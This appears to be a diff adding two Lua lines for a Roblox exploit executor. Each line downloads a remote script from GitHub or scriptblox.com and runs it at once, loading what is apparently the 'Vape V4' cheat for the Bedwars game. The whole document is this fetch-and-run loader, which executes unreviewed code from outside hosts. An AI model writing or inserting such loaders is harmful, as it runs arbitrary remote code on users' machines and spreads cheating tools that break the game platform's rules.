@@ -1,0 +1,2 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/RyAtlasX/Script-Storages/main/VAPE%20V4%20%5Bbedwar%5D"))()
+loadstring(game:HttpGet("https://scriptblox.com/raw/Vape-V4-For-Roblox_316"))()
